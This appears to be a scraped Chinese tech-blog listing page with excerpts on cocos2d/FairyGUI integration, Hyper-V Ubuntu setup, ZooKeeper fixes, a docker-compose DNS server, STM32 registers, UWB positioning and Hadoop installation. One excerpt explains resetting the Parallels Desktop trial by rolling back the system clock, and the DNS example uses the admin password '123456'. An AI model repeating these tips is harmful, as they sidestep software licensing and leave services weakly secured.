在xcode里的cocos2d_libs.xcodeproj下的editor-support下添加fairygui的引用，然后在Build Settings的左上角，选择cocos2d_libs(注意是蓝色图标)，在User Header Search Paths中添加${SRCROOT}/../cocos/editor-support/fairygui/Classes。然后在cocos2d_lua_bindings.xcodeproj的auto和manual里添加对应的文件，貌似就可以了。
接入android
修改frameworks\cocos2d-x\cocos\Android.mk，在适当的位置添加
LOCAL_STATIC_LIBRARIES += fairygui_static
$(call import-module,editor-support/fairygui)
修改frameworks\cocos2d-x\cocos\scripting\lua-bindings\proj.android\Android.mk，
在适当的位置添加
LOCAL_SRC_FILES += ../manual/fairygui/lua_cocos2dx_fairygui_manual.cpp \
../manual/fairygui/LuaBasicConversions_fairygui.cpp \
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9ab0384e9255f88a0151f91514a3c054/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c12d3c0b9f98bce9526b75140b595a63/" rel="bookmark">
			win10 Hyper-V安装配置ubuntu虚拟机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		win10 Hyper-V安装配置ubuntu虚拟机 启用Hyper-V 开始-&gt;设置-&gt;应用-&gt;程序和功能-&gt;启用或关闭Windows功能。
在打开的窗口中，选择“Hyper-V”，弃选“适用于Linux的Windows子系统”和“虚拟机平台”。
重启。
win键-&gt;Windows管理工具-&gt;Hyper-V管理器，就是win10自带的虚拟机管理程序了。
Hyper-V的虚拟交换机原理 Hyper-V创造了虚拟交换机的概念，把所有的虚拟机连接到虚拟交换机，虚拟交换机连接到网络。
虚拟交换机的类型有3种：
外部虚拟交换机
绑定到物理网络适配器，从而直连物理网络。虚拟机通过虚拟交换机向网络申请独立的IP地址访问物理网络。在这种模式下，物理计算机（宿主机）也允许被视作连接到外部虚拟交换机的一个设备，地位和其他虚拟机相同。 如果外部虚拟交换机选择和宿主机共享网络适配器，则宿主机也连接到外部虚拟交换机，通过外部虚拟交换机上网。
如果外部虚拟交换机选择不和宿主机共享网络适配器，那么宿主机连接到另一个物理网络适配器，或者不能连接网络（在物理计算机只有一个物理网络适配器的情况下）。
内部虚拟交换机
介于物理计算机（宿主机）和虚拟机之间，只能用于虚拟机之间以及虚拟机和物理计算机之间的连接。内部虚拟交换机不提供与物理网络之间的连接，但只要物理计算机可以上网，内部虚拟交换机能自动使用NAT(网络地址转换)向虚拟机提供计算机网络的访问权限。 宿主机通过物理网络适配器连接网络，同时通过虚拟网络适配器连接内部虚拟交换机，和其他虚拟机通信。虚拟机通过内部虚拟交换机的NAT功能，通过宿主机访问网络。
专用虚拟交换机
和内部虚拟交换机类似，但物理计算机（宿主机）和虚拟机之间无法连接。 宿主机不连接专用虚拟交换机，故无法和虚拟机通信。虚拟机也无法上网。
NIC: Network Interface Card。网络适配器，俗称网卡或网络接口卡。
创建虚拟交换机 Hyper-V默认创建了内部虚拟交换机。
可以用Hyper-V管理器的“虚拟交换机管理器”创建新的虚拟交换机：
创建外部虚拟交换机时，可以配置是否和宿主机共享物理网络适配器:
可以创建多个虚拟交换机。
虚拟机的网络适配器随时可以更换连接到的虚拟交换机，非常方便。
管理操作系统：是指起管理作用的操作系统，这个操作系统负责管理所有的虚拟机。一般情况下，宿主机的操作系统就是管理操作系统。
创建虚拟机 从ubuntu官网下载镜像文件ubuntu-20.04.2.0-desktop-amd64.iso。
启动Hyper-V管理器，新建-&gt;虚拟机。弹出新建虚拟机向导，然后逐项填写。
指定名称和位置
名称：VirtualUbuntu，可自己决定。
位置：勾选“将虚拟机存储在其他位置”，位置为“D:\ubuntu”，可自己决定。指定代数
选择第二代，功能更新一点。分配内存
启动内存：2048MB。可自己决定。
勾选“为此虚拟机使用动态内存”，虚拟机在内存不够时可继续扩展内存。配置网络
配置虚拟机的网络适配器连接到哪个虚拟交换机。可选择连接Default Switch，也可以连接其他的虚拟交换机。Default Switch是Hyper-V创建的使用NAT模式的内部虚拟交换机。这个配置在虚拟机创建后，也是可以随时修改的。Hyper-V的虚拟交换机有3种类型，虚拟机创建完成后，仍然可以配置其网络适配器，切换连接到的虚拟交换机。连接虚拟硬盘
勾选“创建虚拟硬盘”，大小200GB，可自己决定。安装选项
勾选“从可启动的映像文件安装操作系统”，然后填写映像文件ubuntu-20.04.2.0-desktop-amd64.iso的位置。 配置完成后的摘要如下：
然后再设置一下虚拟机：
安全：取消“启用安全启动”。因为启用安全启动后，安装iso时会报错。内存：勾选“启用动态内存”，最大RAM 8192MB，可自己决定。网络适配器：根据情况选择连接合适的虚拟交换机。因为公司电脑只允许一个IP且绑定了MAC地址，所以我选择Default Switch，这是Hyper-V默认创建的内部虚拟交换机。如果网络允许为一台电脑分配多个IP，可以考虑连接外部虚拟交换机，这样虚拟机可以直接上网，可以被外网机器发现并连接。如果连接内部虚拟交换机，虚拟机只能被其他虚拟机或者宿主机发现并连接。 关闭虚拟机后可随时修改虚拟机的设置。
在虚拟机中安装ubuntu 选择之前创建的虚拟机，连接。
进入虚拟机界面后，点击启动，就进入安装了。安装过程和普通安装基本一样。我选择了“最小安装”，取消“安装Ubuntu时下载更新”，以加快安装速度。
配置ubuntu 安装完成，重启ubuntu。然后配置一些服务，方便在宿主机中操作ubuntu系统。
ssh service sudo apt install -y openssh-server
/etc/init.d/ssh是脚本文件，start, stop, status命令都在里面，例如：
service ssh status sudo service ssh start sudo service ssh stop /etc/ssh/sshd_config是配置文件，man sshd_config可以看到详细配置说明。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c12d3c0b9f98bce9526b75140b595a63/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a78ca475215109a59d424cfb360d83b4/" rel="bookmark">
			手机版本android升级包下载,ColorOS8.0升级包下载安装-oppo手机系统ColorOS8.0正式版升级包下载 安卓版 v1.0- 游娱下载站...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Tags： 系统工具
ColorOS8.0升级包是oppo手机推出的最新一代系统，这代8.0系统相比较前一代，在各种方面都有着不小的提升，特别是简洁的主题桌面和流畅如丝滑般的操作体验，深受众多oppo手机用户喜爱，它目前只应用于oppoOPPO Find X2和OPPO Ace2这两种旗舰机型，有需要的话快来尝鲜下载吧！
ColorOS8.0升级包亮点
1、有很多oppo用户都在猜测这次的系统更新，会是什么版本的系统体验；
2、会给用户带来什么样的体验，如何来参与这次的招募，用户可以在平台进入招募入口；
3、作为大版本升级，其带来了诸多贴心的功能，让系统变得更加智能与人性化。
ColorOS8.0升级包优势
1、提供给大家各种不同的方式，能更好的让你找到更新后的体验感；
2、整个系统的感觉还是很方便有趣的，而且看上去也很智能高级化；
3、页面的色彩很好看，还有一些比较好看的护眼功能，很实用。
ColorOS8.0升级包特色
1、全新的交互升级以及更加强大的功能抢先体验，大家可以选择进行下载抢先体验；
2、更有更加舒适的人性化设计等待用户前来体验，全新升级的系统也为广大用户们带来了更多不一样的体验；
3、不管是整个界面还是相关操作方面都得到了优化，整个体验感更流畅，还新增了智能家居控制功能。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0fe6f34b4fc1946028deb480213d8ab/" rel="bookmark">
			当storm的ui界面报错：Could not find leader nimbus
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原因：
因为关闭storm集群时候用的kill，导致关闭异常！
解决方式： 删除zookeeper下的storm节点数据，重启zookeeper，重新发布topology到storm集群即可。 zk操作方式： 首先到zookeeper目录/bin下面，执行
./bin/zkCli.sh -server [ip]:[port]
./bin/zkCli.sh -server 192.168.0.10:2181
如果在本机且端口为默认的2181，可直接输入
./bin/zkCli.sh
然后输入命令：
ls /
显示
[zookeeper, storm]
执行命令删除：
rmr /storm
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e4a1869a8b03c519d1ecb5573abc967/" rel="bookmark">
			魅族Android版本,魅族Flyme安卓版本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1月6日晚，负责Flyme方面的魅族副总杨颜在微博对锤子T1不会更新到安卓5.1的事件进行了调侃：“会玩！说的我都想让工程师把 Flyme 从 Android 5.1 上回退了。”并配图锤子社区的公告...
7月21日消息，魅族Flyme based on Android 10 首个内测版本已推送，本次推送机型：16s Pro、16s。16th Plus、16th目前仍存在异常重启问题未能如期发布，预计本周内推送，请耐心等待。其余机型
小窗模式2. 1 采用全新呼出方式，并扩展了小窗菜单，几乎适配了全部主流应用，能够主动呼出微信平行小窗。横屏下支持使用第三方输入法和悬浮键盘，看视频玩游戏也能尽情聊天。
在电动车领域，特斯拉一直备受关注，旗下的多款车型也成为很多消费者的最爱。 3 月 10 日上午，特斯拉CEO埃隆·马斯克在社交平台发文，庆祝特斯拉第 100 万辆车下线，这对特斯拉而言也是一个里程碑。
Flyme 8.0 稳定版在系统方面有多项功能调整，加入新春风格息屏显示、屏幕指纹解锁动画、锁屏界面农历显示、长重按 mBack 息屏等功能。在相机中加入后置摄像智能扫码，扫描、识别、跳转一步到位；自定义快捷菜单，将常用的模式拖动至首页，拍照更顺手。在图库中新增新春贴纸，把新年期许融合到自拍、合照中，拍照有更多乐趣。
11月12日消息，Flyme 8第一批机型稳定版已在陆续更新中，现在Flyme 8第二批机型稳定版先行试用招募正式开始。
根据魅族科技官方消息，Flyme 8 稳定版将于 11 月、12 月分批推送，共计适配 27 款机型。11 月 11 日，Flyme 8 稳定版陆续更新第一批机型，进入「系统更新」APP 即可检测更新。第一批机型包括：16s Pro、16s、16 X、16th Plus、16th、15 Plus、15、PRO 7 Plus、PRO 7 高配版、魅蓝 Note6。
​今天下午的魅族16T发布会上，魅族也宣布了新一代UI——Flyme 8，稳定版将从 11 月 11 日起开始推送。魅族16T今天会开始内测申请，稳定版 12 月份推送。
今天下午，魅族正式发布Flyme 8系统，官方Slogan为“轻若有灵”，采用了Alive Design的全新设计理念。
今天，全新 Flyme 7 体验版发布，多款机型支持升级 OneMind 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8e4a1869a8b03c519d1ecb5573abc967/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e004a89b1e065134d86d2c77bc2a4b18/" rel="bookmark">
			android 病毒 装不了机,手机中毒不用慌！教你几招安卓手机怎么彻底的进行杀毒...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原标题：手机中毒不用慌！教你几招安卓手机怎么彻底的进行杀毒
手机如果中毒了，你知道要怎么彻底进行杀毒吗？今天我就和大家分享几个安卓手机彻底杀毒以及有效预防病毒的方法。
一、安卓手机彻底杀毒的方法
方法1：使用自带的手机管家
有部分安卓机的系统已经提供了手机管家，以OPPO手机为例，你只要点击打开该应用程序。
然后点击“病毒扫描”功能选项。
就可以自动扫描查杀病毒了，扫描结束后会给出相应的健康评估状态。哈哈，我的手机还是很健康的。
方法2：使用专业的手机杀毒软件
当然了，你也可以下载安装一个更加专业的手机杀毒软件，例如：腾讯手机管家、360手机卫士等等。
以360手机卫士为例，打开APP后直接点击选择“手机杀毒”。
然后点击“快速扫描”按钮，软件就会自动扫描手机设备了。
二、安卓手机杀毒的注意事项
1、杀毒前先关闭正在运行的程序
当软件处于运行状态下，手机杀毒软件很可能会直接跳过不检测，那这样病毒查杀是不彻底的。所以键大家在杀毒前先关闭真正运行的程序。
2、杀毒时要保持手机常亮
有些手机设置了自动锁屏功能，手机一旦被锁屏后，可能会导致软件查杀识别。所以建议在查杀软件的时候要保持手机常亮。
3、杀毒检测后提示有安全漏洞不要忽略不看
如果用软件查杀后，提示手机有安全漏洞，最好尽早修复，不要大意忽略不看。
三、手机如何预防病毒
1、安卓手机尽量不要root
手机root后，虽然用户可以获取更多的功能权限，但是也给病毒打开方便之门。
如果你想要移除root，可以在电脑上安装［强力一键root］，然后把安卓机连接到电脑，点击选择移除本机root即可。
2、不打开陌生链接及网页
如果有收到含陌生链接的短信，建议大家不要随意点击打开。陌生网页也是一样的道理，好奇心太重的朋友往往很容易中招。
3、到官方软件商店下载软件
官方软件站都会商店内的软件进行测试，一般上线的APP都是安全可以放心使用的。
责任编辑：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f4f94dd8b59b324eb12e0369e00c6116/" rel="bookmark">
			你们要的Intellij IDEA 插件开发秘籍！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 https://cloud.tencent.com/developer/article/1348741 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/19c5d9ed6673af3da4f8ebfd8ef9669b/" rel="bookmark">
			CoolShell-第8题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第8题地址：https://fun.coolshell.cn/953172864.html
大概是作进制转换就行，26进制，但是没有从0开始感觉很奇怪（Z相当于0，但是单独一个Z却表示26）。
上代码。
function excel2number(str) { var sum = 0; var weight = 1; for (var i = str.length - 1; i &gt;= 0; --i, weight *= 26) { sum += (str.charCodeAt(i) - 64) * weight; } return sum; } var result = excel2number("COOLSHELL") / excel2number("SHELL"); console.log(result); // 去掉小数 console.log(parseInt(result)); 计算结果是小数的，地址404。
去掉小数后，地址：https://fun.coolshell.cn/85165.html
好吧，要的是字符串。
function number2excel(num) { var result = ""; while (num &gt; 0) { var r = num % 26; if (r == 0) { r = 26; } result = String.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/19c5d9ed6673af3da4f8ebfd8ef9669b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4e9a046f3005e3c04b590295a77e1252/" rel="bookmark">
			CoolShell-第6题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第六题地址：https://fun.coolshell.cn/tree.html
题目的意思是，为了了解下面这串东西加密了什么，你得找到这颗树的最深路径。
根据二叉树的定义，给出中序遍历和后序遍历，可以得知整棵树的完整结构。
用代码解决吧，还是JavaScript。
// 这棵树貌似没有重复节点，难度下降很多 // 1、根据后序遍历特性可知，根在最后一个元素 // 2、根据中序遍历特性可知，根前面打印的元素一定在左子树，根后面打印的元素一定在右子树 // 反复通过1和2推断，就能得到整棵树的结构 var inOrder = "TbHVh3ogPWFLuAfGrm1xJ7we0iQYnZ8Kvqk9y5CNBD24UlcpIEMaj6SROXsdzt"; var postOrder = "TVHo3hPgbFfAumr7Jxew1YQi0ZnGLKy9kqvNDBC54clU28EIRS6jdsXOaMpWtz"; function search(arr, target) { for (var i = 0; i &lt; arr.length; ++i) { if (arr[i] == target) { return i; } } return -1; } function handle(inOrderStr, postOrderStr) { if (!inOrderStr) { return null; } var postOrderPosition = postOrderStr.length - 1; var val = postOrderStr[postOrderPosition]; var inOrderPosition = search(inOrderStr, val); var inOrderLeftStr = inOrderStr.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4e9a046f3005e3c04b590295a77e1252/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f3c9c81c5dee5c1e08e921150826e3e/" rel="bookmark">
			5分钟搭建本地dns
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		title: 5分钟搭建本地dns
date:2021-05-29
tags: [dns]
category: linux 介绍 公司内部服务，如git、svn、jumpserver、maven、jenkins…等等。
由于过多就搭建了dns，原dns是通过linux的named实现，进行新增时太过于麻烦，需要将新的域名和ip手工写入到文件内，即使写了脚本也不便于管理。
而且最关键的是配置了转发上级dns，也会出现某些网站域名解析不到，比如qq邮箱、百度贴吧、好看视频等等。
sameersbn/bind 为了方便管理需要有以下条件
轻量级带图形化 通过寻找资料发现符合以上要求的sameersbn/bind，而且还是docker。
安装 主机ip: 172.16.6.210
因为是docker，所以得先装docker。
安装docke docker安装官方文档
docker-compose安装
为了方便启动使用docker-compose，需要用yaml文件，顺便附上yaml。
version: "3.7" services: bind: image: sameersbn/bind:9.16.1-20200524 restart: always networks: - dns-bind ports: - "53:53" - "53:53/udp" - "10000:10000" volumes: - /opt/dns-bind:/data environment: ROOT_PASSWORD: 123456 #这个web管理页面的账户密码。 networks: dns-bind: docker-compose -f /opt/bind.yml up -d #启动容器 web管理页面 容器启动完成后，在浏览器上输入url，url格式：https://172.16.6.210:10000/
用户：root
密码：“yaml文件上配置的”
添加dns转发
首先添加dns转发（私有dns），若不添加会导致无法解析其它域名。
这3个dns，分别是阿里云dns、百度dns、google dns，添加完后记得保存。 设置dns访问限制 Allow transfers from：允许辅助dns同步主dns zone的ip，any为所有Allow queries from：允许客户端访问dns服务的ip，any为所有。 添加域名 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4f3c9c81c5dee5c1e08e921150826e3e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b39eab04dcd2914f4985e153dc076f87/" rel="bookmark">
			STM32从设置IO输入上下拉到寄存器GPIOx_BSRR、GPIOx_BRR
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1. 问题概述2. 标准库中查找3. GPIOx_BSRR和GPIOx_BRR端口位配置表 1. 问题概述 因为一些原因使用寄存器方式进行开发，设置IO状态时发现：
表格中10表示上拉/下拉输入模式，到底是上拉还是下拉呢？以往使用库方式开发没有关系过这个问题，现在使用寄存器方式开发，到底该如何设置上下拉？
表格中提到请参考表17端口位配置表，不过也可以先去标准库看一看，对照查看加深理解。
2. 标准库中查找 首先想到去标准库中对照看下是如何配置的。标准库中通过枚举定义出支持的IO模式：
/** * @brief Configuration Mode enumeration */ typedef enum { GPIO_Mode_AIN = 0x0, GPIO_Mode_IN_FLOATING = 0x04, GPIO_Mode_IPD = 0x28, GPIO_Mode_IPU = 0x48, GPIO_Mode_Out_OD = 0x14, GPIO_Mode_Out_PP = 0x10, GPIO_Mode_AF_OD = 0x1C, GPIO_Mode_AF_PP = 0x18 }GPIOMode_TypeDef; 可以看出上下拉是要区分配置的，然后查找函数
void GPIO_Init(GPIO_TypeDef* GPIOx, GPIO_InitTypeDef* GPIO_InitStruct)的定义，其中IO模式部分如下：
/* Reset the corresponding ODR bit */ if (GPIO_InitStruct-&gt;GPIO_Mode == GPIO_Mode_IPD) { GPIOx-&gt;BRR = (((uint32_t)0x01) &lt;&lt; pinpos); } else { /* Set the corresponding ODR bit */ if (GPIO_InitStruct-&gt;GPIO_Mode == GPIO_Mode_IPU) { GPIOx-&gt;BSRR = (((uint32_t)0x01) &lt;&lt; pinpos); } } 可以看出需要GPIOx_BSRR和GPIOx_BRR两个寄存器来具体配置上下拉。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b39eab04dcd2914f4985e153dc076f87/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/35fc8277672f45d646a40caed8cbc269/" rel="bookmark">
			Parallels Desktop 16.5 M1使用到期的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Parallels Desktop 16.5 M1使用到期怎么办？将mac的系统时间改为使用到期之前的时间即可：
就比如现在我的体验到期时间是2021-5-20号https://www.macv.com/news/357.html
接下来修改mac的当前系统时间，点击时间与日期
将当前时间改为到期日期之前时间，再去查看试用时间(现已变成3天，改时间大法还是依旧的稳)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f97f992c204971eeffba7909289169ff/" rel="bookmark">
			TypeError: Cannot read property ‘0‘ of null前台报错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错详情：
主要原因是vue在异步调用时，渲染数据，出现数据原本为空的情况，
比如我这里：
解决方法是加一条v-if="xxx!=null"即可；
另外：
这种情况也类似，要特别注意出现三重情况：
如果此篇文章有所帮助，希望点赞支持~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23b23180b92ba176d6afa2cebbccf592/" rel="bookmark">
			谷歌相机android4,谷歌相机10.0版本 7.4.200.316937482 安卓版
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		谷歌相机10.0版本是一款很棒的清晰的谷歌相机APP。谷歌相机10.0版本的相机功能很强大的，里面的相机拍摄的模式很丰富的，拍摄的相片也很清晰的，非常的适合现在的拍摄的风格的哟，好用可以来下载！
软件简介
谷歌的相机算法是集成在相机APP里面的，并非集成在系统里。
所以最近两年都有Android开发者不断移植谷歌相机，借此来让其他手机也能用上谷歌精良的相机算法。近日，XDA论坛就有开发者给我们带来了最新的华为专版谷歌相机，并已经开放了下载(下载链接在文末)。
根据这名开发者的介绍，这个移植版谷歌相机能够完美兼容华为Mate 10、Mate 10 Pro以及荣耀Play这三款新机。
此外，这个移植版除了集成了Pixel 3的相机算法之外，同样支持谷歌最新研发的Night Sight功能，能够带来极致的夜景效果。
软件功能
实时滤镜：自拍全手工调制的滤镜，让你的图片格调 Max！
创作壁纸：可以做壁纸的！你说，除了咱家，谁家的相机还带做壁纸的？
Emoji：深井冰的 Emoji 模彷秀，还可以做成动图发到微信
图片融合：深深太平洋里，浩瀚繁星。通过双色渐变让颜色富有层次，添加漏光和自定义渐晕，获得复古感觉！
软件特色
【优选滤镜】多名摄影师倾力巨献，精选多款超质感表现力滤镜，让你轻松拍出质感大片，带领社交圈拍照流行
【智能推荐】运用先进的AI场景识别技术，智能匹配适应当下场景的优选滤镜列表，让每一个场景的呈现都质感丰富与彰显动人色彩
【极速拍摄】拍照体验深入优化，即拍即存，记录每一刻绚烂，定格质感生活瞬间
【高清画质】拒绝低画质，拍照清晰度显著提升，尽显高清世界之美
更新日志
暂无更新
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f07640277bb00be73752021b3257d199/" rel="bookmark">
			修改Grafana 默认的 home Dashboards
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Grafana 登陆以后默认展示的页面名称是 Home，这个页面是可以自己进行定义并且进行更改的，当我们使用 Grafana 构建了自己的可以观测分析平台的时候，我们希望对这个页面进行定制，更新成我们自己的样子。
为了达到这个问题，我们需要首先自定义一个我们喜欢的页面，这个页面定义好以后，我们就可以进行更改了。 更改这个页面，我们可以让所有人、特定的团队、个人来看到对应的页面。
全局 Home Dashboards 修改 有两种方式可以更改全局的 Home Dashboards
第一种 首选项修改 通过单击仪表板标题旁边的星号为该仪表板加星 在左侧菜单上，将光标停留在 Configuration (齿轮)图标上，然后单击 Preferences 。 首选项页面有 3 个指标可以进行修改，分别是 UI 主题、Home Dashboards、Timezone（时区），我们选择 Home Dashboards 进行修改，选择之前编辑好的 Dashboards，这里只显示加星的 Dashboards ，所以第一步要对 Dashboards 进行加星。 点击 Save 进行保存。 第二种 配置文件 将编辑好的 Dashboards 导出 json 文件，比如 home.json 登陆部署 Grafana 的机器，将该文件放置到预置的路径，比如 /etc/grafana/home.json 修改 Grafana 的配置文件 grafana.ini 修改 dashboards 部分如下 [dashboards] # Path to the default home dashboard. If this value is empty, then Grafana uses StaticRootPath + "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f07640277bb00be73752021b3257d199/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d0e2b860eed5f763d85085024ded410/" rel="bookmark">
			UWB技术是如何实现厘米级精度定位的~
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一般来说，gps定位误差在300米左右，但是基于UWB技术的定位却能达到厘米级的误差范围，为什么UWB技术能实现这么高精准的定位呢？
ToF（Time of Flight） 飞行时间测距法
ToF为飞行时间测距法，通过测量脉冲信号从出发到返回的时间，乘以传播速度（脉冲信号在空气中的传播速度为定值v=30万KM/秒），得到往返一次的距离，除以2即为UWB定位标签到定位基站间的距离。
UWB定位基站的坐标已知，测得标签到基站距离后，通过三点定位法画3个圆，交点即为UWB定位标签的位置。
如上图所示：UWB定位基站的坐标分别为R1（x1、y1）、R2（x2、y2）、R3（x3、y3），基站R1、R2、R3在安装部署时位置固定且坐标已知，所求定位标签的坐标为Ro（xo、yo）。设定d1、d2、d3分别为3个定位基站与定位标签Ro之间通过信号的传播时间计算的相对距离，每个基站以相对距离为半径画一个圆形轨迹。利用三个圆形方程能够计算出唯一的交点，计算公式如下公式所示：
测距方法属于双向测距技术，它主要利用信号在标签和基站之间往返的飞行时间来测量节点间的距离。传统的测距技术分为双向测距技术和单向测距技术。ToF属于双向测距技术，而TDoA则是单向测距技术，只需要测量定位基站到定位标签之间的单程距离即可。
TDoA（Time Difference of Arrival） 到达时间差
TDoA定位是一种利用时间差进行计算的方法。精准的绝对时间相对较难测量，通过比较信号到达各个UWB定位基站的时间差，计算出信号到各个定位基站的距离差，就能作出以定位基站为焦点，距离差为长轴的双曲线，三组双曲线的交点就是定位标签的位置。
如上图所示：UWB定位基站的坐标分别为R1（x1，y1）、R2（x2，y2）、R3（x3，y3）、R4（x4，y4），基站R1、R2、R3、R4在安装部署时位置固定且坐标已知，所求定位标签的坐标为Ro（xo，yo）。脉冲信号的传播速度为常数v=30万km/秒，假设脉冲信号从标签O到达基站R1、R2、R3、R4的时间为t1、t2、t3、t4，分别以（R1、R4），（R2、R4），（R3、R4）做为焦点，定位标签Ro发送的信号到两基站间的距离差为常数，可以得到3组双曲线，双曲线的交点即是定位标签O的坐标。求解坐标（xo，yo）的方程组如下公式所示：
不同于ToF的是，TDoA是通过检测信号到达两个基站的时间差，而不是到达的绝对时间来确定移动台的位置，因此降低了系统对时间同步的要求。TDoA算法是对ToF算法的改进，与ToF算法相比，不需要加入专门的时间戳，定位精度也有所提高。
乾坤物联正是基于UWB技术原理，开发的UWB定位技术产品定位精度最高可达10cm，通过软件配合，可实现人员轨迹和资产位置可视化，帮助企业实现物联网，智慧管理目标。
引自http://www.qiankuniot.com/xw3.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b5679eed5e0dd220dcd8bb4ded7e2234/" rel="bookmark">
			成功解决 error: no match for ‘operator*’ (operand types are ‘SO3’ and ‘Eigen::Quaternion＜double＞’)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		error: no match for ‘operator*’ (operand types are ‘SO3’ and ‘Eigen::Quaternion’)
SO3 q_u = q_T * plane_c.inverse();
查看源码中的重载代码，执行operator*操作的两数据类型都是SO3，所以数据类型冲突，更改数据类型。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d7c7347ad55995a5fab27c8e1099518/" rel="bookmark">
			Linux重器hadoop压缩包,Linux下安装Hadoop(2.7.1)详解及WordCount运行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、引言
在完成了Storm的环境配置之后，想着鼓捣一下Hadoop的安装，网上面的教程好多，但是没有一个特别切合的，所以在安装的过程中还是遇到了很多的麻烦，并且最后不断的查阅资料，终于解决了问题，感觉还是很好的，下面废话不多说，开始进入正题。
本机器的配置环境如下：
Hadoop(2.7.1)
Ubuntu Linux(64位系统)
下面分为几个步骤来详解配置过程。
二、安装ssh服务
进入shell命令，输入如下命令，查看是否已经安装好ssh服务，若没有，则使用如下命令进行安装：
sudo apt-get install ssh openssh-server
安装过程还是比较轻松加愉快的。
三、使用ssh进行无密码验证登录
1.创建ssh-key，这里我们采用rsa方式，使用如下命令：
ssh-keygen -t rsa -P ""
2.出现一个图形，出现的图形就是密码，不用管它
cat ~/.ssh/id_rsa.pub &gt;&gt; authorized_keys(好像是可以省略的)
3.然后即可无密码验证登录了，如下：
ssh localhost
成功截图如下：
四、下载Hadoop安装包
下载Hadoop安装也有两种方式
2.使用shell进行下载，命令如下：
wget http://mirrors.hust.edu.cn/apache/hadoop/core/stable/hadoop-2.7.1.tar.gz
貌似第二种的方法要快点，经过漫长的等待，终于下载完成。
五、解压缩Hadoop安装包
使用如下命令解压缩Hadoop安装包
tar -zxvf hadoop-2.7.1.tar.gz
解压缩完成后出现hadoop2.7.1的文件夹
六、配置Hadoop中相应的文件
需要配置的文件如下，hadoop-env.sh，core-site.xml，mapred-site.xml.template，hdfs-site.xml，所有的文件均位于hadoop2.7.1/etc/hadoop下面，具体需要的配置如下：
1.core-site.xml 配置如下：
hadoop.tmp.dir
file:/home/leesf/program/hadoop/tmp
Abase for other temporary directories.
fs.defaultFS
hdfs://localhost:9000
其中的hadoop.tmp.dir的路径可以根据自己的习惯进行设置。
2.mapred-site.xml.template配置如下：
mapred.job.tracker
localhost:9001
3.hdfs-site.xml配置如下：
dfs.replication
1
dfs.namenode.name.dir
file:/home/leesf/program/hadoop/tmp/dfs/name
dfs.datanode.data.dir
file:/home/leesf/program/hadoop/tmp/dfs/data
其中dfs.namenode.name.dir和dfs.datanode.data.dir的路径可以自由设置，最好在hadoop.tmp.dir的目录下面。
补充，如果运行Hadoop的时候发现找不到jdk，可以直接将jdk的路径放置在hadoop.env.sh里面，具体如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2d7c7347ad55995a5fab27c8e1099518/">Read more…</a>
	</div>
